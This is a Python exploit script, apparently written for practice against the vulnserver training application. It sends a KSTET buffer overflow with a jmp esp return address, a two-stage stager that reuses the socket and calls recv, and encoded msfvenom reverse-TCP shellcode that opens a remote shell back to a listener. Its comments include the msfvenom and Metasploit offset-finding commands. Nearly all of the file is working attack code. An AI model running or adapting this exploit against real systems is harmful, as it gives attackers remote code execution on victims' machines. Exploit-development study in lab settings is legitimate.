#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from time import sleep
from sys import exit

verbose = False
rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

first_stage = (
    "\x54"  # PUSH ESP
    "\x5A"  # POP EDX
    # note how nasm_shell.rb wants this when building the command
    # nasm > SUB EDX,70
    # 00000000  83EA46            sub edx,byte +0x46
    "\x83\xEA\x46"  # SUB EDX, 46 (46 hex == 70 decimal)
    "\xFF\xE2"  # JMP EDX
)
first_stage += "\x90" * (30 - len(first_stage))

# len 66
second_stage = (
    "\x90"                  # NOP
    "\x54"                  # PUSH ESP
    "\x59"                  # POP ECX                 - We're going to align ECX to the socket number associated with our connection
    "\x66\x81\xC1\x88\x01"  # ADD CX,0x188            - In our case, this requires us to add 0x188 hex / 392 decimal
    "\x83\xEC\x50"          # SUB ESP,50              - Move ESP above EIP so that we don't overwrite our own shellcode
    "\x33\xD2"              # XOR EDX,EDX             - Zero out EDX
    "\x52"                  # PUSH EDX                - Flags (WS2_32.recv argument) = 0
    "\x80\xC6\x02"          # ADD DH,2                - EDX becomes 0x00000200h or 512 decimal
    "\x52"                  # PUSH EDX                - Buffer (WS2_32.recv argument) = 512 bytes / 0x200h
    "\x54"                  # PUSH ESP                - Move ESP
    "\x5B"                  # POP EBX                 - Into EBX to that we can setup where we want our recv'd shellcode to end up
    "\x83\xC3\x50"          # ADD EBX,50              - Adjust where we want to do the recv
    "\x53"                  # PUSH EBX                - Buffer Location (WS2_32.recv argument) to hold our shellcode
    "\xFF\x31"              # PUSH DWORD PTR DS:[ECX] - the value at the address in ECX (where our sockfd is)
    "\xB8\x11\x2C\x25\x40"  # MOV EAX,40252C11        - modified version of our target location of 0040252C
    "\xC1\xE8\x08"          # SHR EAX,8               - shift right 8 bytes, meaning we drop 11, and pick up 00 at the front
    "\xFF\xD0"              # CALL EAX  ; <JMP.&WS2_32.recv> ; CALL 0040252C  - call WS2_32.recv and read in our shellcode
)
second_stage += "\x90" * (66 - len(second_stage))

# shellcode, let's hope!
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.153.135 LPORT=4444 -a x86 --platform windows -b '\x00' -f python -v shellcode
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
shellcode =  ""
shellcode += "\xbf\xf8\x71\x6e\x51\xdd\xc7\xd9\x74\x24\xf4\x5d"
shellcode += "\x29\xc9\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\x15"
shellcode += "\x8d\x8c\xa4\x19\x86\xd3\x47\xe1\x57\xb4\xce\x04"
shellcode += "\x66\xf4\xb5\x4d\xd9\xc4\xbe\x03\xd6\xaf\x93\xb7"
shellcode += "\x6d\xdd\x3b\xb8\xc6\x68\x1a\xf7\xd7\xc1\x5e\x96"
shellcode += "\x5b\x18\xb3\x78\x65\xd3\xc6\x79\xa2\x0e\x2a\x2b"
shellcode += "\x7b\x44\x99\xdb\x08\x10\x22\x50\x42\xb4\x22\x85"
shellcode += "\x13\xb7\x03\x18\x2f\xee\x83\x9b\xfc\x9a\x8d\x83"
shellcode += "\xe1\xa7\x44\x38\xd1\x5c\x57\xe8\x2b\x9c\xf4\xd5"
shellcode += "\x83\x6f\x04\x12\x23\x90\x73\x6a\x57\x2d\x84\xa9"
shellcode += "\x25\xe9\x01\x29\x8d\x7a\xb1\x95\x2f\xae\x24\x5e"
shellcode += "\x23\x1b\x22\x38\x20\x9a\xe7\x33\x5c\x17\x06\x93"
shellcode += "\xd4\x63\x2d\x37\xbc\x30\x4c\x6e\x18\x96\x71\x70"
shellcode += "\xc3\x47\xd4\xfb\xee\x9c\x65\xa6\x66\x50\x44\x58"
shellcode += "\x77\xfe\xdf\x2b\x45\xa1\x4b\xa3\xe5\x2a\x52\x34"
shellcode += "\x09\x01\x22\xaa\xf4\xaa\x53\xe3\x32\xfe\x03\x9b"
shellcode += "\x93\x7f\xc8\x5b\x1b\xaa\x5f\x0b\xb3\x05\x20\xfb"
shellcode += "\x73\xf6\xc8\x11\x7c\x29\xe8\x1a\x56\x42\x83\xe1"
shellcode += "\x31\xc1\x44\x70\x46\x71\x67\x82\x58\xde\xee\x64"
shellcode += "\x30\xce\xa6\x3f\xad\x77\xe3\xcb\x4c\x77\x39\xb6"
shellcode += "\x4f\xf3\xce\x47\x01\xf4\xbb\x5b\xf6\xf4\xf1\x01"
shellcode += "\x51\x0a\x2c\x2d\x3d\x99\xab\xad\x48\x82\x63\xfa"
shellcode += "\x1d\x74\x7a\x6e\xb0\x2f\xd4\x8c\x49\xa9\x1f\x14"
shellcode += "\x96\x0a\xa1\x95\x5b\x36\x85\x85\xa5\xb7\x81\xf1"
shellcode += "\x79\xee\x5f\xaf\x3f\x58\x2e\x19\x96\x37\xf8\xcd"
shellcode += "\x6f\x74\x3b\x8b\x6f\x51\xcd\x73\xc1\x0c\x88\x8c"
shellcode += "\xee\xd8\x1c\xf5\x12\x79\xe2\x2c\x97\x89\xa9\x6c"
shellcode += "\xbe\x01\x74\xe5\x82\x4f\x87\xd0\xc1\x69\x04\xd0"
shellcode += "\xb9\x8d\x14\x91\xbc\xca\x92\x4a\xcd\x43\x77\x6c"
shellcode += "\x62\x63\x52"


# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
buff = second_stage
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
buff += pack("<L", 0x62501203)
buff += first_stage

if __name__ == '__main__':
    print('[+] creating payload')
    payload = "KSTET /.:/{buff}\r\n".format(buff=buff)
    if verbose:
        print('[*] payload:\n\t{payload}'.format(payload=payload))
    print('[+] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[+] checking for welcome message')
    msg = s.recv(1024)
    print('[+] received welcome message')
    if verbose:
        print('[*] welcome message: {msg}'.format(msg=msg))
    print('[+] sending payload')
    s.send(payload)
    sleep(2)
    print('[+] exploit sent, sending payload')
    s.send(shellcode)
    print('[+] Cleaning up')
    s.close()

